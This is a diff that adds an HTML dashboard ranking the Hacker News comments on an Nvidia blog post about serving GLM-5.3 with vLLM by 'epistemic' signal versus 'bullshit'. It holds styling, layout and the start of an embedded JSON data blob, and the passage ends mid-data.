@@ -1,0 +1,1259 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>HN 50497155 // Serving GLM-5.3 at 607.8 tok/s across two Nvidia DGX stations with vLLM — Epistemic Observatory</title>
+  <style>
+    * { box-sizing: border-box; }
+    html {
+      scrollbar-gutter: stable;
+      overflow-anchor: none;
+    }
+    @supports (interpolate-size: allow-keywords) {
+      :root { interpolate-size: allow-keywords; }
+    }
+    body {
+      margin: 8px;
+      background: rgb(247, 247, 245);
+      color: rgb(13, 13, 13);
+      font: 15px/1.5 "Helvetica Neue", Helvetica, Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+    .wrap {
+      max-width: 1240px;
+      margin: 0 auto;
+      width: 85%;
+    }
+    .sheet-top {
+      border-top: 3px solid rgb(13, 13, 13);
+      border-bottom: 1px solid rgb(13, 13, 13);
+      padding: 16px 0 26px;
+    }
+    .eyebrow {
+      font: 600 11px/1.4 ui-monospace, SFMono-Regular, Menlo, monospace;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      color: rgb(90, 90, 88);
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .eyebrow strong { color: rgb(255, 51, 0); }
+    h1 {
+      font-size: clamp(36px, 5.2vw, 72px);
+      line-height: 0.96;
+      letter-spacing: -0.045em;
+      margin: 18px 0 14px;
+      font-weight: 800;
+    }
+    h1 .accent { color: rgb(255, 51, 0); }
+    .sublead {
+      max-width: 920px;
+      font-size: 16px;
+      color: rgb(52, 52, 50);
+      margin: 0;
+    }
+    .grid-12 {
+      display: grid;
+      grid-template-columns: repeat(12, minmax(0, 1fr));
+      gap: 18px;
+    }
+    .col-1 { grid-column: span 1; min-width: 0; }
+    .col-2 { grid-column: span 2; min-width: 0; }
+    .col-3 { grid-column: span 3; min-width: 0; }
+    .col-4 { grid-column: span 4; min-width: 0; }
+    .col-5 { grid-column: span 5; min-width: 0; }
+    .col-6 { grid-column: span 6; min-width: 0; }
+    .col-7 { grid-column: span 7; min-width: 0; }
+    .col-8 { grid-column: span 8; min-width: 0; }
+    .col-9 { grid-column: span 9; min-width: 0; }
+    .col-10 { grid-column: span 10; min-width: 0; }
+    .col-11 { grid-column: span 11; min-width: 0; }
+    .col-12 { grid-column: span 12; min-width: 0; }
+
+    .band {
+      border-bottom: 1px solid rgb(195, 195, 190);
+      padding: 24px 0;
+    }
+    .sec-tag {
+      font: 700 11px/1.2 ui-monospace, SFMono-Regular, Menlo, monospace;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: rgb(255, 51, 0);
+      margin-bottom: 6px;
+    }
+    h2 {
+      font-size: 24px;
+      letter-spacing: -0.03em;
+      line-height: 1.12;
+      margin: 0 0 10px;
+    }
+    .kpi-strip {
+      display: grid;
+      grid-template-columns: repeat(6, minmax(0, 1fr));
+      border: 1px solid rgb(13, 13, 13);
+      background: rgb(255, 255, 253);
+    }
+    .kpi-cell {
+      padding: 16px 16px 14px;
+      border-right: 1px solid rgb(205, 205, 200);
+    }
+    .kpi-cell:last-child { border-right: 0; }
+    .kpi-label {
+      font: 600 10px/1.3 ui-monospace, SFMono-Regular, Menlo, monospace;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: rgb(90, 90, 88);
+    }
+    .kpi-val {
+      font-size: 34px;
+      font-weight: 800;
+      letter-spacing: -0.04em;
+      line-height: 1.05;
+      margin: 8px 0 4px;
+    }
+    .kpi-val.hi { color: rgb(255, 51, 0); }
+    .kpi-val.ok { color: rgb(0, 138, 75); }
+    .kpi-sub {
+      font-size: 12px;
+      color: rgb(90, 90, 88);
+    }
+
+    /* Cyber-Industrial Recessed OLED Bays (Locked Equal-Height & Zero-Jitter) */
+    .oled-bay {
+      background: rgb(13, 15, 17);
+      color: rgb(228, 232, 236);
+      border: 2px solid rgb(35, 38, 42);
+      padding: 16px;
+      position: relative;
+      border-radius: 6px;
+      corner-shape: bevel;
+      display: flex;
+      flex-direction: column;
+      flex: 1;
+      min-width: 0;
+      overflow: hidden;
+    }
+    .oled-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      gap: 10px;
+      height: 16px;
+      min-width: 0;
+      overflow: hidden;
+      white-space: nowrap;
+      margin-bottom: 10px;
+      font: 600 11px/16px ui-monospace, SFMono-Regular, Menlo, monospace;
+      color: rgb(156, 166, 176);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+    .oled-head > span:first-child {
+      min-width: 0;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .oled-head span.sig { color: rgb(0, 230, 118); flex-shrink: 0; }
+    canvas.plot {
+      width: 100%;
+      max-width: 100%;
+      min-width: 0;
+      height: 300px;
+      display: block;
+      background: rgb(9, 11, 13);
+      border: 1px solid rgb(42, 47, 54);
+      cursor: crosshair;
+      flex-shrink: 0;
+    }
+    .legend-row {
+      display: flex;
+      flex-wrap: wrap;
+      align-content: flex-start;
+      gap: 4px 12px;
+      height: 34px;
+      overflow: hidden;
+      margin-top: 10px;
+      font: 500 11px/15px ui-monospace, SFMono-Regular, Menlo, monospace;
+      color: rgb(180, 188, 196);
+    }
+    .dot {
+      display: inline-block;
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+      margin-right: 5px;
+      vertical-align: -1px;
+    }
+    .probe-box {
+      margin-top: 10px;
+      padding: 10px 12px;
+      height: 58px;
+      background: rgb(20, 24, 28);
+      border-left: 3px solid rgb(0, 230, 118);
+      font: 12px/19px ui-monospace, SFMono-Regular, Menlo, monospace;
+      color: rgb(220, 226, 232);
+      overflow: hidden;
+    }
+    .probe-clamp {
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+      max-height: 38px;
+    }
+
+    /* Collapsible 03A / 03B Justification Drawer */
+    details.proof-drawer {
+      border-bottom: 1px solid rgb(195, 195, 190);
+      padding: 12px 0;
+    }
+    details.proof-drawer > summary {
+      list-style: none;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+      padding: 10px 14px;
+      background: rgb(239, 239, 234);
+      border: 1px solid rgb(13, 13, 13);
+      font: 700 11px/1.3 ui-monospace, SFMono-Regular, Menlo, monospace;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      user-select: none;
+    }
+    details.proof-drawer > summary::-webkit-details-marker { display: none; }
+    details.proof-drawer > summary:hover { border-color: rgb(255, 51, 0); }
+    details.proof-drawer > summary .toggle-pill {
+      flex-shrink: 0;
+      padding: 3px 8px;
+      background: rgb(13, 13, 13);
+      color: rgb(247, 247, 245);
+      font-size: 10px;
+    }
+    details.proof-drawer[open] > summary .toggle-pill::before { content: attr(data-hide); }
+    details.proof-drawer:not([open]) > summary .toggle-pill::before { content: attr(data-show); }
+    .proof-body {
+      padding-top: 16px;
+    }
+
+    /* Scientific Ablation Table */
+    table.ablation {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 13px;
+      background: rgb(255, 255, 253);
+      border: 1px solid rgb(13, 13, 13);
+    }
+    table.ablation th, table.ablation td {
+      padding: 9px 11px;
+      border-bottom: 1px solid rgb(214, 214, 208);
+      text-align: right;
+      font-variant-numeric: tabular-nums;
+    }
+    table.ablation th:first-child, table.ablation td:first-child {
+      text-align: left;
+      font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+      font-size: 12px;
+    }
+    table.ablation th {
+      background: rgb(236, 236, 231);
+      font: 700 10px/1.3 ui-monospace, SFMono-Regular, Menlo, monospace;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: rgb(60, 60, 58);
+    }
+    table.ablation tr.winner {
+      background: rgba(0, 230, 118, 0.11);
+      font-weight: 700;
+    }
+    table.ablation tr.hn-row {
+      background: rgba(255, 51, 0, 0.08);
+    }
+
+    /* Controls & Explorer */
+    .control-panel {
+      background: rgb(239, 239, 234);
+      border: 1px solid rgb(13, 13, 13);
+      padding: 16px;
+    }
+    .slider-row {
+      margin-bottom: 11px;
+    }
+    .slider-lbl {
+      display: flex;
+      justify-content: space-between;
+      font: 600 11px/1.3 ui-monospace, SFMono-Regular, Menlo, monospace;
+      margin-bottom: 3px;
+    }
+    input[type="range"] {
+      width: 100%;
+      accent-color: rgb(255, 51, 0);
+    }
+    .btn-bar {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 7px;
+      margin-bottom: 12px;
+    }
+    button.tab-btn {
+      appearance: none;
+      border: 1px solid rgb(13, 13, 13);
+      background: rgb(255, 255, 253);
+      color: rgb(13, 13, 13);
+      padding: 7px 11px;
+      font: 600 11px/1.2 ui-monospace, SFMono-Regular, Menlo, monospace;
+      cursor: pointer;
+      box-shadow: 0 2px 0 rgb(13, 13, 13);
+    }
+    button.tab-btn.active {
+      background: rgb(13, 13, 13);
+      color: rgb(247, 247, 245);
+    }
+    button.tab-btn:hover {
+      border-color: rgb(255, 51, 0);
+    }
+    .filter-bar {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-bottom: 12px;
+      align-items: center;
+    }
+    input.search-in, select.sel-in {
+      padding: 8px 11px;
+      border: 1px solid rgb(13, 13, 13);
+      background: rgb(255, 255, 253);
+      font: 600 12.5px/1.3 ui-monospace, SFMono-Regular, Menlo, monospace;
+      color: rgb(13, 13, 13);
+      min-width: 0;
+    }
+    input.search-in { flex: 1; min-width: 220px; font-weight: 400; }
+    .probe-inline-btn {
+      appearance: none;
+      border: 1px solid rgb(0, 230, 118);
+      background: rgba(0, 230, 118, 0.14);
+      color: rgb(0, 230, 118);
+      padding: 1px 7px;
+      margin-left: 6px;
+      font: 700 10.5px/1.3 ui-monospace, SFMono-Regular, Menlo, monospace;
+      cursor: pointer;
+    }
+
+    /* Comment Cards — Authentic Hacker News Surface & Typography */
+    .card-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      min-height: 100vh;
+      overflow-anchor: none;
+    }
+    article.c-card {
+      background: rgb(246, 246, 239);
+      border: 1px solid rgb(216, 216, 206);
+      border-left: 4px solid rgb(255, 102, 0);
+      padding: 11px 15px 10px;
+    }
+    article.c-card.tier-epistemic_gold { border-left-color: rgb(0, 158, 96); }
+    article.c-card.tier-grounded_analysis { border-left-color: rgb(16, 98, 188); }
+    article.c-card.tier-meme_or_snark { border-left-color: rgb(230, 145, 0); }
+    article.c-card.tier-bullshit_or_flamewar { border-left-color: rgb(255, 51, 0); }
+    article.c-card.tier-downvoted_sink { border-left-color: rgb(156, 156, 156); }
+
+    .hn-comhead {
+      font: 8pt/1.35 Verdana, Geneva, sans-serif;
+      color: rgb(130, 130, 130);
+      margin-bottom: 5px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      align-items: center;
+    }
+    .hn-comhead a {
+      color: rgb(130, 130, 130);
+      text-decoration: none;
+    }
+    .hn-comhead a:hover { text-decoration: underline; }
+    .hn-votearrow {
+      color: rgb(150, 150, 150);
+      font-size: 9px;
+      margin-right: 1px;
+    }
+    .c-meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      align-items: center;
+      font: 600 10px/1.25 ui-monospace, SFMono-Regular, Menlo, monospace;
+      color: rgb(90, 90, 86);
+      margin-bottom: 6px;
+    }
+    .badge {
+      padding: 2px 6px;
+      background: rgb(236, 236, 228);
+      border: 1px solid rgb(204, 204, 194);
+      color: rgb(35, 35, 35);
+    }
+    .badge.rank-sig { background: rgb(13, 13, 13); color: rgb(247, 247, 245); border-color: rgb(13, 13, 13); }
+    .badge.rescue { background: rgba(0, 180, 100, 0.15); border-color: rgb(0, 140, 80); color: rgb(0, 105, 58); }
+    .badge.drop { background: rgba(255, 51, 0, 0.12); border-color: rgb(220, 45, 0); color: rgb(175, 30, 0); }
+    .badge.c5a { background: rgba(255, 179, 0, 0.20); border-color: rgb(195, 130, 0); color: rgb(120, 75, 0); }
+
+    /* Exact news.css Verdana comment font & downvote fade color ramp */
+    .c-body {
+      white-space: pre-wrap;
+      font: 9.5pt/1.44 Verdana, Geneva, sans-serif;
+      color: rgb(0, 0, 0);
+      margin: 6px 0 9px;
+      max-width: 96ch;
+      overflow-wrap: anywhere;
+    }
+    .c-body.comm-c00 { color: rgb(0, 0, 0); }
+    .c-body.comm-c5a { color: rgb(90, 90, 90); }
+    .c-body.comm-c73 { color: rgb(115, 115, 115); }
+    .c-body.comm-c88 { color: rgb(136, 136, 136); }
+    .c-body.comm-c9c { color: rgb(156, 156, 156); }
+    .c-body.comm-cae { color: rgb(174, 174, 174); }
+    .c-body.comm-cbe { color: rgb(190, 190, 190); }
+    .c-body.comm-cce { color: rgb(206, 206, 206); }
+    .c-body.comm-cdd { color: rgb(221, 221, 221); }
+    .c-body .hn-quote {
+      color: rgb(85, 85, 85);
+      font-style: italic;
+    }
+    .vec-bars {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      font: 600 10px/1.2 ui-monospace, SFMono-Regular, Menlo, monospace;
+      color: rgb(88, 88, 84);
+      padding-top: 8px;
+      border-top: 1px dashed rgb(218, 218, 212);
+    }
+    .ext-link {
+      color: rgb(16, 78, 158);
+      text-decoration: underline;
+      text-underline-offset: 3px;
+    }
+    footer.sheet-foot {
+      border-top: 3px solid rgb(13, 13, 13);
+      padding-top: 14px;
+      margin-top: 36px;
+      font: 12px/1.5 ui-monospace, SFMono-Regular, Menlo, monospace;
+      color: rgb(90, 90, 88);
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+
+    .dual-oled {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 16px;
+      min-width: 0;
+    }
+    details.graph-drawer {
+      display: flex;
+      flex-direction: column;
+      min-width: 0;
+    }
+    details.graph-drawer:not([open]) > .oled-bay,
+    details.graph-drawer:not([open]) > .control-panel {
+      display: none;
+    }
+    summary.graph-summary {
+      list-style: none;
+      pointer-events: none;
+      cursor: default;
+      min-width: 0;
+    }
+    summary.graph-summary::-webkit-details-marker { display: none; }
+    .graph-title-group { min-width: 0; }
+    .mob-graph-pill { display: none; }
+    .dual-oled h2 {
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    @media (max-width: 960px) {
+      .col-1, .col-2, .col-3, .col-4, .col-5, .col-6,
+      .col-7, .col-8, .col-9, .col-10, .col-11 { grid-column: span 12; }
+      .dual-oled { grid-template-columns: 1fr; gap: 10px; }
+      details.graph-drawer { display: block; }
+      summary.graph-summary {
+        pointer-events: auto;
+        cursor: pointer;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        gap: 12px;
+        padding: 10px 12px;
+        background: rgb(239, 239, 234);
+        border: 1px solid rgb(13, 13, 13);
+        user-select: none;
+      }
+      summary.graph-summary h2 {
+        font-size: 17px;
+        margin: 0;
+        white-space: normal;
+      }
+      details.graph-drawer[open] > .oled-bay,
+      details.graph-drawer[open] > .control-panel {
+        margin-top: 8px;
+      }
+      .mob-graph-pill {
+        display: inline-block;
+        flex-shrink: 0;
+        padding: 4px 8px;
+        background: rgb(13, 13, 13);
+        color: rgb(247, 247, 245);
+        font: 700 10px/1.2 ui-monospace, SFMono-Regular, Menlo, monospace;
+        letter-spacing: 0.06em;
+      }
+      details.graph-drawer[open] > summary .mob-graph-pill::before { content: "[-] HIDE"; }
+      details.graph-drawer:not([open]) > summary .mob-graph-pill::before { content: "[+] SHOW"; }
+      .kpi-strip { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+      .kpi-cell { border-bottom: 1px solid rgb(205, 205, 200); }
+      .filter-bar {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 8px;
+      }
+      .filter-bar select.sel-in {
+        width: 100%;
+        font-size: 16px;
+        padding: 8px 9px;
+      }
+      .filter-bar input.search-in {
+        grid-column: span 2;
+        width: 100%;
+        min-width: 0;
+        font-size: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="wrap">
+  <header class="sheet-top">
+    <div class="eyebrow">
+      <span>NYX OBSERVATORY // <a class="ext-link" href="https://news.ycombinator.com/item?id=50497155">HN ITEM 50497155</a> // DEVELOPER.NVIDIA.COM</span>
+      <span><strong>BULLSHIT: 71.9%</strong>
+    </div>
+    <h1>Bullshit vs. <span class="accent">Epistemic.</span></h1>
+    <p class="sublead">
+      <strong>57</strong> Hacker News comments on <a class="ext-link" href="https://developer.nvidia.com/blog/when-one-gpu-isnt-enough-serving-glm-5-3-across-two-nvidia-dgx-stations-with-vllm/">Serving GLM-5.3 at 607.8 tok/s across two Nvidia DGX stations with vLLM (developer.nvidia.com)</a>.
+    </p>
+  </header>
+
+  <details class="proof-drawer" id="proofDrawer">
+    <summary>
+      <span>01 // EVIDENCE</span>
+      <span class="toggle-pill" data-show="[+] SHOW" data-hide="[-] HIDE"></span>
+    </summary>
+    <p>
+      Replacing surface crowd prediction and <code>(T + 2)^1.8</code> recency decay with Shannon/IDF surprisal, Popperian falsifiability,
+      Frankfurtian bullshit suppression, inverse <code>news.arc</code> physics, and submodular portfolio selection.
+    </p>
+    <div class="proof-body">
+      <div class="kpi-strip">
+        <div class="kpi-cell">
+          <div class="kpi-label">Corpus Audited</div>
+          <div class="kpi-val">57</div>
+          <div class="kpi-sub">1 HTML page(s) &bull; 48 cached/live authors</div>
+        </div>
+        <div class="kpi-cell">
+          <div class="kpi-label">Actual Useful Signal</div>
+          <div class="kpi-val ok">28.1%</div>
+          <div class="kpi-sub">16 comments (3 Gold / 5.3%)</div>
+        </div>
+        <div class="kpi-cell">
+          <div class="kpi-label">Chatter &amp; Bullshit</div>
+          <div class="kpi-val hi">71.9%</div>
+          <div class="kpi-sub">26 chatter &bull; 15 BS &bull; 0 faded</div>
+        </div>
+      <div class="kpi-cell">
+        <div class="kpi-label">Primary Citations</div>
+        <div class="kpi-val ok">1</div>
+        <div class="kpi-sub">3% of Epistemic Top 30 cite Tier 2/3</div>
+      </div>
+      <div class="kpi-cell">
+        <div class="kpi-label">Portfolio Diversity</div>
+        <div class="kpi-val">0.888</div>
+        <div class="kpi-sub">5 auto-discovered TF-IDF facets</div>
+      </div>
+        <div class="kpi-cell">
+          <div class="kpi-label">Largest Root Monopoly</div>
+          <div class="kpi-val hi">35</div>
+          <div class="kpi-sub">HN POS 1..35 (61.4% of thread)</div>
+        </div>
+      </div>
+    </div>
+    <div class="proof-body grid-12">
+      <div class="col-7">
+        <div class="sec-tag">01A / UNSUPERVISED 5-CLUSTER FACETS (SPHERICAL K-MEANS++)</div>
+        <h2>Auto-Discovered Sub-Themes &amp; Signal Yield</h2>
+        <div style="overflow-x:auto">
+          <table class="ablation" id="facetDiagTable">
+            <thead>
+              <tr>
+                <th>Discovered Facet Cluster</th>
+                <th>Comments</th>
+                <th>Useful Signal</th>
+                <th>Signal %</th>
+                <th>Centroid Salient Terms</th>
+              </tr>
+            </thead>
+            <tbody id="facetDiagBody"></tbody>
+          </table>
+        </div>
+      </div>
+      <div class="col-5">
+        <div class="sec-tag">01B / SOURCE REGISTRY &amp; STORY ANCHORS</div>
+        <h2>Cross-Domain Citations &amp; TF-IDF Anchors</h2>
+        <div style="overflow-x:auto; max-height: 365px; overflow-y: auto;">
+          <table class="ablation" id="sourceCatTable">
+            <thead>
+              <tr>
+                <th>Source Registry Category</th>
+                <th>Cited Comments</th>
+              </tr>
+            </thead>
+            <tbody id="sourceCatBody"></tbody>
+          </table>
+          <div id="anchorListBox" style="margin-top:10px;font:600 11px/1.5 ui-monospace,Menlo,monospace;color:rgb(70,70,68)"></div>
+        </div>
+      </div>
+    </div>
+  </details>
+
+  <details class="proof-drawer" id="labDrawer">
+    <summary>
+      <span>02 // EXPLORE</span>
+      <span class="toggle-pill" data-show="[+] SHOW" data-hide="[-] HIDE"></span>
+    </summary>
+    <div class="proof-body grid-12">
+      <div class="col-3">
+        <details class="graph-drawer" id="tunerDrawer">
+          <summary class="graph-summary">
+            <div class="graph-title-group">
+              <div class="sec-tag">02A / INTERACTIVE EQUATION</div>
+              <h2>Epistemic Tuner</h2>
+            </div>
+            <span class="mob-graph-pill"></span>
+          </summary>
+          <div class="control-panel">
+            <div class="slider-row">
+              <div class="slider-lbl"><span>1. Info Gain (IDF)</span><span id="val_ig"></span></div>
+              <input type="range" id="sl_ig" min="0" max="5" step="0.05">
+            </div>
+            <div class="slider-row">
+              <div class="slider-lbl"><span>2. Falsifiability</span><span id="val_fa"></span></div>
+              <input type="range" id="sl_fa" min="0" max="5" step="0.05">
+            </div>
+            <div class="slider-row">
+              <div class="slider-lbl"><span>3. Gravity &amp; Precision</span><span id="val_gp"></span></div>
+              <input type="range" id="sl_gp" min="0" max="4" step="0.05">
+            </div>
+            <div class="slider-row">
+              <div class="slider-lbl"><span>4. Bullshit Penalty</span><span id="val_bp"></span></div>
+              <input type="range" id="sl_bp" min="0" max="5" step="0.05">
+            </div>
+            <div class="slider-row">
+              <div class="slider-lbl"><span>5. Downvote Sink</span><span id="val_dp"></span></div>
+              <input type="range" id="sl_dp" min="0" max="5" step="0.05">
+            </div>
+            <button class="tab-btn" id="resetWeightsBtn" style="width:100%;margin-top:6px">Reset Calibrated Weights</button>
+            <p style="font-size:11.5px;line-height:1.42;color:rgb(85,85,82);margin:12px 0 0">
+              Drag any weight to watch the 57-point phase plane and comment ranking re-solve instantaneously.<br>
+              &bull; <strong>c5A Rescue:</strong> Sourced <code>c5A</code> rebuttals survive partisan downvotes.<br>
+              &bull; <strong>Context Gate:</strong> Meme links &amp; bare drops get zero citation boost.
+            </p>
+          </div>
+        </details>
+      </div>
+
+      <div class="col-9">
+        <div class="dual-oled">
+          <details class="graph-drawer" id="phaseDrawer" open>
+            <summary class="graph-summary">
+              <div class="graph-title-group">
+                <div class="sec-tag">02B / EPISTEMIC PHASE PLANE</div>
+                <h2>Crowd Chatter vs. Grounded Signal</h2>
+              </div>
+              <span class="mob-graph-pill"></span>
+            </summary>
+            <div class="oled-bay">
+              <div class="oled-head">
+                <span>Y: Bullshit // X: Epistemic</span>
+                <span class="sig">TAP POINT (N = 57)</span>
+              </div>
+              <canvas id="phaseCanvas" class="plot" width="540" height="300"></canvas>
+              <div class="legend-row">
+                <span><i class="dot" style="background:rgb(0,230,118)"></i>Gold (3)</span>
+                <span><i class="dot" style="background:rgb(56,189,248)"></i>Grounded (13)</span>
+                <span><i class="dot" style="background:rgb(148,163,184)"></i>Chatter (26)</span>
+                <span><i class="dot" style="background:rgb(255,179,0)"></i>Meme (0)</span>
+                <span><i class="dot" style="background:rgb(255,68,0)"></i>BS (15)</span>
+              </div>
+              <div class="probe-box"><div id="phaseProbe" class="probe-clamp">Tap or hover any point to inspect its coordinates and filter the comment below.</div></div>
+            </div>
+          </details>
+
+          <details class="graph-drawer" id="gravityDrawer">
+            <summary class="graph-summary">
+              <div class="graph-title-group">
+                <div class="sec-tag">02C / NEWS.ARC GRAVITY &amp; TREE-LOCK</div>
+                <h2>Why Live HN Buried Primary Evidence</h2>
+              </div>
+              <span class="mob-graph-pill"></span>
+            </summary>
+            <div class="oled-bay">
+              <div class="oled-head">
+                <span>Y: HN POS (1..57) // X: Age (Hours)</span>
+                <span class="sig">(T + 2)^1.8</span>
+              </div>
+              <canvas id="gravityCanvas" class="plot" width="540" height="300"></canvas>
+              <div class="legend-row">
+                <span><i class="dot" style="background:rgb(0,230,118)"></i>Buried Gold (HN POS &gt; 25)</span>
+                <span><i class="dot" style="background:rgb(255,179,0)"></i>Surf Mirage (&lt;3.2h)</span>
+                <span><i class="dot" style="background:rgb(255,68,0)"></i>Downvoted / Mod-Rebuked</span>
+              </div>
+              <div class="probe-box"><div id="gravProbe" class="probe-clamp">Top slot (@hkalbasi, 5.2h); largest subtree (@hkalbasi) occupies 35 slots (HN POS 1..35).</div></div>
+            </div>
+          </details>
+        </div>
+      </div>
+    </div>
+  </details>
+
+  <section class="band grid-12" id="explorerSection" style="padding-top:16px">
+    <div class="col-12">
+      <div class="filter-bar">
+        <select id="modeSelect" class="sel-in" aria-label="Ranking view">
+          <option value="hn_top40">HN Top 40</option>
+          <option value="top_signal">Epistemic Top 50</option>
+          <option value="buried_gems">Buried Gems (HN POS &gt; 25)</option>
+          <option value="bullshit_traps">High-Karma / URL Traps Caught</option>
+          <option value="mod_morgue">Mod Rebukes &amp; Downvoted Morgue</option>
+          <option value="c5a_rescues">c5A Heterodox Rescues</option>
+        </select>
+        <select id="facetSelect" class="sel-in" aria-label="Topic facet">
+          <option value="all">All Facets (57)</option>
+          <option value="user_buying">User &amp; Buying (Hardware) (16)</option>
+          <option value="frontier_models">Frontier &amp; Models (GPU) (15)</option>
+          <option value="input_output">Input &amp; Output (Roi) (10)</option>
+          <option value="glm5_model">Glm-5 &amp; Model (Flash) (10)</option>
+          <option value="glm_rtx">Glm &amp; Rtx (SEC) (4)</option>
+          <option value="general_commentary">General Commentary (2)</option>
+        </select>
+        <input type="search" id="searchInput" class="search-in" placeholder="Search text, @author, dgx, nvidia, stations, gpu, glm-5...">
+      </div>
+      <div id="resultMeta" style="font:600 11px/1.4 ui-monospace,Menlo,monospace;color:rgb(90,90,88);margin-bottom:10px"></div>
+      <div id="cardContainer" class="card-list"></div>
+    </div>
+  </section>
+
+  <footer class="sheet-foot">
+    <span>SILICON PIRATE &times; CARBON PIRATE // ZERO-HASH DEFENSIVE ARTIFACT (RGB ONLY)</span>
+    <span>SOURCE: HN 50497155 + DEVELOPER.NVIDIA.COM + ALGOLIA + AUTHOR CACHE</span>
+  </footer>
+</div>
+
+<script id="observatoryData" type="application/json">{"story_id": 50497155, "story_title": "Serving GLM-5.3 at 607.8 tok/s across two Nvidia DGX stations with vLLM", "story_url": "https://developer.nvidia.com/blog/when-one-gpu-isnt-enough-serving-glm-5-3-across-two-nvidia-dgx-stations-with-vllm/", "is_benchmark": false, "manifest": {"version": "2.1.0", "story_id": 50497155, "story_title": "Serving GLM-5.3 at 607.8 tok/s across two Nvidia DGX stations with vLLM", "story_url": "https://developer.nvidia.com/blog/when-one-gpu-isnt-enough-serving-glm-5-3-across-two-nvidia-dgx-stations-with-vllm/", "points": 113, "story_author": "wondersky", "article_source": "fetched_url", "t1_ref_utc": "2026-11-14T20:05:48+00:00", "t2_ref_utc": "2026-11-14T20:05:48+00:00", "delta_minutes": 0.0, "story_anchors": ["dgx", "nvidia", "stations", "gpu", "glm-5", "tok", "concurrency", "throughput", "model", "per", "gpus", "open", "station", "end", "memory", "weights", "latency", "serve", "token", "gb300", "tokens", "speed", "inference", "network", "version"], "facet_labels": {"frontier_models": "Frontier & Models (GPU)", "glm_rtx": "Glm & Rtx (SEC)", "input_output": "Input & Output (Roi)", "glm5_model": "Glm-5 & Model (Flash)", "user_buying": "User & Buying (Hardware)", "general_commentary": "General Commentary"}, "facet_clusters": [{"slug": "frontier_models", "label": "Frontier & Models (GPU)", "count": 15, "top_terms": ["frontier", "models", "gpu", "gonna"]}, {"slug": "glm_rtx", "label": "Glm & Rtx (SEC)", "count": 4, "top_terms": ["glm", "rtx", "sec", "setup"]}, {"slug": "input_output", "label": "Input & Output (Roi)", "count": 10, "top_terms": ["input", "output", "roi", "per"]}, {"slug": "glm5_model", "label": "Glm-5 & Model (Flash)", "count": 10, "top_terms": ["glm-5", "model", "flash", "task"]}, {"slug": "user_buying", "label": "User & Buying (Hardware)", "count": 16, "top_terms": ["user", "buying", "hardware", "chose"]}], "counts": {"total_comments": 57, "live_t2_comments": 57, "algolia_dead_comments": 0, "downvoted_faded_t2": 0, "unique_authors_profiled": 48, "mod_rebuked_comments": 0, "near_duplicates_gt_065": 0, "pages_fetched": 1}, "sha256": {"corpus.json": "2cf79e054a18cf3f584a70c02df9755a46f56cd74f4679fd11c3985cb0aae90d"}}, "judge": null, "weights": {"info_gain": 2.35, "falsifiability": 2.85, "gravity_progeny": 1.45, "bullshit_penalty": 2.65, "downvote_penalty": 3.1, "mmr_sim_lambda": 2.3, "mmr_root_lambda": 0.42, "mmr_facet_lambda": 0.22}, "tiers": {"epistemic_gold": 3, "grounded_analysis": 13, "crowd_chatter": 26, "bullshit_or_flamewar": 15}, "facets": {"user_buying": 16, "frontier_models": 15, "input_output": 10, "glm_rtx": 4, "glm5_model": 10, "general_commentary": 2}, "facet_options": [{"slug": "user_buying", "label": "User & Buying (Hardware)", "count": 16}, {"slug": "frontier_models", "label": "Frontier & Models (GPU)", "count": 15}, {"slug": "input_output", "label": "Input & Output (Roi)", "count": 10}, {"slug": "glm5_model", "label": "Glm-5 & Model (Flash)", "count": 10}, {"slug": "glm_rtx", "label": "Glm & Rtx (SEC)", "count": 4}, {"slug": "general_commentary", "label": "General Commentary", "count": 2}], "facet_diagnostics": [{"slug": "user_buying", "label": "User & Buying (Hardware)", "count": 16, "useful": 3, "useful_pct": 18.8, "terms": "user, buying, hardware, chose"}, {"slug": "frontier_models", "label": "Frontier & Models (GPU)", "count": 15, "useful": 3, "useful_pct": 20.0, "terms": "frontier, models, gpu, gonna"}, {"slug": "input_output", "label": "Input & Output (Roi)", "count": 10, "useful": 4, "useful_pct": 40.0, "terms": "input, output, roi, per"}, {"slug": "glm5_model", "label": "Glm-5 & Model (Flash)", "count": 10, "useful": 4, "useful_pct": 40.0, "terms": "glm-5, model, flash, task"}, {"slug": "glm_rtx", "label": "Glm & Rtx (SEC)", "count": 4, "useful": 2, "useful_pct": 50.0, "terms": "glm, rtx, sec, setup"}, {"slug": "general_commentary", "label": "General Commentary", "count": 2, "useful": 0, "useful_pct": 0.0, "terms": "general, commentary"}], "source_categories": [{"category": "general_web", "count": 2}, {"category": "code_repository", "count": 1}], "story_anchors": ["dgx", "nvidia", "stations", 